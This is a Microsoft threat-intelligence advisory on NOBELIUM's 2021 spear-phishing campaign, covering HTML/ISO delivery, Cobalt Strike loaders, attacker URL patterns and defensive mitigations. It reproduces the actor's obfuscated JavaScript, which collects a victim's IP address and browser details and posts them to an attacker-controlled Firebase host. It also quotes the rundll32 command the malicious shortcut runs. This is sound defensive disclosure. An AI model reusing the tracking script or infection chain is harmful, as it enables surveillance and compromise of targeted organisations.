May 28, 2021

Microsoft Threat Intelligence Center (MSTIC) has uncovered a wide-scale malicious email campaign operated by NOBELIUM, the
threat actor behind the attacks against SolarWinds, the SUNBURST backdoor, TEARDROP malware, GoldMax malware, and other
related components. The campaign, initially observed and tracked by Microsoft since January 2021, evolved over a series of waves
demonstrating significant experimentation. On May 25, 2021, the campaign escalated as NOBELIUM leveraged the legitimate massmailing service, Constant Contact, to masquerade as a US-based development organization and distribute malicious URLs to a wide
variety of organizations and industry verticals.
Microsoft is issuing this alert and new security research regarding this sophisticated email-based campaign that NOBELIUM has been
operating to help the industry understand and protect from this latest activity. Below, we have outlined attacker motives, malicious
behavior, and best practices to protect against this attack. You can also find more information on the Microsoft On The Issues blog.
Note: This is an active incident. We will post more details here as they become available.
Update [05/28/2021]: We published a new blog post detailing NOBELIUM’s latest early-stage toolset, composed of four tools utilized in a
unique infection chain: EnvyScout, BoomBox, NativeZone, and VaporRage.
NOBELIUM has historically targeted government organizations, non-government organizations (NGOs), think tanks, military, IT
service providers, health technology and research, and telecommunications providers. With this latest attack, NOBELIUM attempted to
target approximately 3,000 individual accounts across more than 150 organizations, employing an established pattern of using unique
infrastructure and tooling for each target, increasing their ability to remain undetected for a longer period of time.
This new wide-scale email campaign leverages the legitimate service Constant Contact to send malicious links that were obscured
behind the mailing service’s URL (many email and document services provide a mechanism to simplify the sharing of files, providing
insights into who and when links are clicked). Due to the high volume of emails distributed in this campaign, automated email threat

detection systems blocked most of the malicious emails and marked them as spam. However, some automated threat detection systems
may have successfully delivered some of the earlier emails to recipients either due to configuration and policy settings or prior to
detections being in place.
Due to the fast-moving nature of this campaign and its perceived scope, Microsoft encourages organizations to investigate and monitor
communications matching characteristics described in this report and take the actions described below in this article.
We continue to see an increase in sophisticated and nation-state-sponsored attacks and, as part of our ongoing threat research and
efforts to protect customers, we will continue to provide guidance to the security community on how to secure against and respond to
these multi-dimensional attacks.

Spear-phishing campaign delivers NOBELIUM payloads
The NOBELIUM campaign observed by MSTIC and detailed in this blog differs significantly from the NOBELIUM operations that ran
from September 2019 until January 2021, which included the compromise of the SolarWinds Orion platform. It is likely that these
observations represent changes in the actor’s tradecraft and possible experimentation following widespread disclosures of previous
incidents.

Early testing and initial discovery
As part of the initial discovery of the campaign in February, MSTIC identified a wave of phishing emails that leveraged the Google
Firebase platform to stage an ISO file containing malicious content, while also leveraging this platform to record attributes of those who
accessed the URL. MSTIC traced the start of this campaign to January 28, 2021, when the actor was seemingly performing early
reconnaissance by only sending the tracking portion of the email, leveraging Firebase URLs to record targets who clicked. No delivery of
a malicious payload was observed during this early activity.

Evolving delivery techniques
In the next evolution of the campaign, MSTIC observed NOBELIUM attempting to compromise systems through an HTML file attached
to a spear-phishing email. When opened by the targeted user, a JavaScript within the HTML wrote an ISO file to disc and encouraged
the target to open it, resulting in the ISO file being mounted much like an external or network drive. From here, a shortcut file (LNK)

would execute an accompanying DLL, which would result in Cobalt Strike Beacon executing on the system.

Figure 1. Example Flow of HMTL/ISO infection chain.
Here’s an example of target fingerprinting code leveraging Firebase:
try {
let sdfgfghj = '';
let kjhyui = new XMLHttpRequest();
kjhyui.open('GET', 'https://api.ipify.org/?format=jsonp?callback=?', false);
kjhyui.onreadystatechange = function (){
sdfgfghj = this.responseText;
}

kjhyui.send(null);
let ioiolertsfsd = navigator.userAgent;
let uyio = window.location.pathname.replace('/','');
var ctryur = {'io':ioiolertsfsd,'tu':uyio,'sd':sdfgfghj};
ctryur = JSON.stringify(ctryur);
let sdfghfgh = new XMLHttpRequest();
sdfghfgh.open('POST', 'https://eventbrite-com-default-rtdb.firebaseio.com/root.json', false);
sdfghfgh.setRequestHeader('Content-Type', 'application/json');
sdfghfgh.send(ctryur);
} catch (e) {}

Similar spear-phishing campaigns were detected throughout March, which included the NOBELIUM actor making several alterations to
the accompanying HTML document based on the intended target. MSTIC also observed the actor experimenting with removing the ISO
from Firebase, and instead encoding it within the HTML document. Similarly, the actor experimented with redirecting the HTML
document to an ISO, which contained an RTF document, with the malicious Cobalt Strike Beacon DLL encoded within the RTF. In one
final example of experimentation, there was no accompanying HTML in the phishing email and instead a URL led to an independent
website spoofing the targeted organizations, from where the ISO was distributed.
The phishing message and delivery method was not the only evolving factor in the campaign. In one of the more targeted waves, no ISO
payload was delivered, but additional profiling of the target device was performed by an actor-controlled web server after a user clicked
the link. If the device targeted was an Apple iOS device, the user was redirected to another server under NOBELIUM control, where the
since-patched zero-day exploit for CVE-2021-1879 was served.

Escalated targeting and delivery
Experimentation continued through most of the campaign but began to escalate in April 2021. During the waves in April, the actor
abandoned the use of Firebase, and no longer tracked users using a dedicated URL. Their techniques shifted to encode the ISO within
the HTML document and have that responsible for storing target host details on a remote server via the use of the api.ipify.org service.
The actor sometimes employed checks for specific internal Active Directory domains that would terminate execution of the malicious
process if it identified an unintended environment.

In May 2021, the actor changed techniques once more by maintaining the HTML and ISO combination, but dropped a custom .NET
first-stage implant, detected as TrojanDownloader:MSIL/BoomBox, that reported host-based reconnaissance data to, and downloaded
additional payloads from, the Dropbox cloud storage platform.
On May 25, the NOBELIUM campaign escalated significantly. Using the legitimate mass mailing service Constant Contact, NOBELIUM
attempted to target around 3,000 individual accounts across more than 150 organizations. Due to the high-volume campaign,
automated systems blocked most of the emails and marked them as spam. However, automated systems might have successfully
delivered some of the earlier emails to recipients.
In the May 25 campaign, there were several iterations. In one example the emails appear to originate from USAID
<ashainfo@usaid.gov>, while having an authentic sender email address that matches the standard Constant Contact service. This
address (which varies for each recipient) ends in @in.constantcontact.com, and (which varies for each recipient), and a Reply-To
address of <mhillary@usaid.gov> was observed. The emails pose as an alert from USAID, as seen below.

If the user clicked the link on the email, the URL directs them to the legitimate Constant Contact service, which follows this pattern:
https://r20.rs6[.]net/tn.jsp?f=
The user is then redirected to NOBELIUM-controlled infrastructure, with a URL following this pattern:
https://usaid.theyardservice[.]com/d/<target_email_address>
A malicious ISO file is then delivered to the system. Within this ISO file are the following files that are saved in the
%USER%\AppData\Local\Temp\<random folder name>\ path:
A shortcut, such as Reports.lnk, that executes a custom Cobalt Strike Beacon loader
A decoy document, such as ica-declass.pdf, that is displayed to the target
A DLL, such as Document.dll, that is a custom Cobalt Strike Beacon loader dubbed NativeZone by Microsoft

The end result when detonating the LNK file is the execution of “C:\Windows\system32\rundll32.exe Documents.dll,Open”.
The successful deployment of these payloads enables NOBELIUM to achieve persistent access to compromised systems. Then, the
successful execution of these malicious payloads could enable NOBELIUM to conduct action-on objectives, such as lateral movement,
data exfiltration, and delivery of additional malware.
Indicators of compromise (IOCs) for the campaign occurring on May 25 are provided in this blog to help security teams to identify actor
activity.
Microsoft security researchers assess that the NOBELIUM’s spear-phishing operations are recurring and have increased in frequency
and scope. It is anticipated that additional activity may be carried out by the group using an evolving set of tactics.
Microsoft continues to monitor this threat actor’s evolving activities and will update as necessary. Microsoft 365 Defender delivers
coordinated defense against this threat. Microsoft Defender for Office 365 detects the malicious emails, and Microsoft Defender for
Endpoints detects the malware and malicious behaviors. Additionally, customers should follow defensive guidance and leverage
advanced hunting to help mitigate variants of actor activity.

Mitigations
Apply these mitigations to reduce the impact of this threat. Check the recommendations card for the deployment status of monitored
mitigations.
Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly
evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown
variants.
Run EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft
antivirus doesn’t detect the threat or when Microsoft Defender Antivirus is running in passive mode. (EDR in block mode works
behind the scenes to remediate malicious artifacts that are detected post-breach.)

Use device discovery to increase your visibility into your network by finding unmanaged devices on your network and onboarding
them to Microsoft Defender for Endpoint.
Enable multifactor authentication (MFA) to mitigate compromised credentials. Microsoft strongly encourages all customers
download and use passwordless solutions like Microsoft Authenticator to secure your accounts.
For Office 365 users, see multifactor authentication support.
For Consumer and Personal email accounts, see how to use two-step verification.
Turn on the following attack surface reduction rule to block or audit activity associated with this threat: Block all Office
applications from creating child processes. NOTE: Assess rule impact before deployment.

Indicators of compromise (IOC)
This attack is still active, so these indicators should not be considered exhaustive for this observed activity. These indicators of
compromise are from the large-scale campaign launched on May 25, 2021.
